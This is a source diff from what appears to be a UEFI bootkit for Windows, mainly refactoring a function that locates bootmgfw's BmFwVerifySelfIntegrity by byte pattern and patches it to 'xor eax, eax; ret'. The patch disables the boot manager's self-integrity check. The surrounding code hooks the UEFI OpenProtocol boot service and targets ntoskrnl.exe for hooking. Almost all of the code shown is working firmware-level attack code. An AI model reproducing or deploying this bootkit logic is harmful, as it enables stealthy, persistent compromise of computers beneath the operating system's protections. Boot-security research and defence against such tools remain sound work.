@@ -101,8 +101,8 @@ static void HookNtoskrnl(void* ImageBase, uint64_t ImageSize)
 
 static bool IsNtoskrnl(const wchar_t* ImageName)
 {
-    static const wchar_t Ntoskrnl[] = L"ntoskrnl.exe";
-    static const size_t NtoskrnlLen = ARRAY_SIZE(Ntoskrnl) - 1;
+    constexpr wchar_t Ntoskrnl[] = L"ntoskrnl.exe";
+    constexpr size_t NtoskrnlLen = ARRAY_SIZE(Ntoskrnl) - 1;
 
     auto ImageNameLen = wcslen(ImageName);
     if (ImageNameLen < NtoskrnlLen)
@@ -167,7 +167,7 @@ static void HookBootServices()
     gBS->OpenProtocol = OpenProtocolHook;
 }
 
-static void HookBootmgfw(void* ImageBase, uint64_t ImageSize)
+static void PatchSelfIntegrity(void* ImageBase, uint64_t ImageSize)
 {
     /*
     bootmgfw!BmFwVerifySelfIntegrity
@@ -188,6 +188,7 @@ static void HookBootmgfw(void* ImageBase, uint64_t ImageSize)
     .text:000000001002AE82 83 4D 38 FF           or      [rbp+arg_0], 0FFFFFFFFh
     .text:000000001002AE86 83 4D 40 FF           or      [rbp+a1], 0FFFFFFFFh
     */
+
     auto VerifySelfIntegrityMid = FIND_PATTERN(ImageBase, ImageSize, "\x83\x4D\xCC\xFF\x83\x4D\xCC\xFF");
     if (VerifySelfIntegrityMid != nullptr)
     {
@@ -197,8 +198,7 @@ static void HookBootmgfw(void* ImageBase, uint64_t ImageSize)
         auto BmFwVerifySelfIntegrity = FIND_PATTERN(VerifySelfIntegrityMid - WalkBack, WalkBack, "\x89\x4C\x24\x08");
         if (BmFwVerifySelfIntegrity != nullptr)
         {
-            // xor eax, eax; ret
-            memcpy(BmFwVerifySelfIntegrity, "\x33\xC0\xC3", 3);
+            memcpy(BmFwVerifySelfIntegrity, "\x33\xC0\xC3", 3); // xor eax, eax; ret
         }
         else
         {
@@ -272,9 +272,11 @@ EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable
 
         if (FixRelocations(ImageBase, (uint64_t)ImageBase - (uint64_t)NtImageBase))
         {
-            // Install the hooks
+            // Patch self integrity checks
+            PatchSelfIntegrity(EfiImage->ImageBase, OriginalImageSize);
+
+            // Install boot services hook
             HookBootServices();
-            HookBootmgfw(EfiImage->ImageBase, OriginalImageSize);
 
             // Call the original entry point (embedded in the bootkit PE)
             auto OriginalEntryRva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
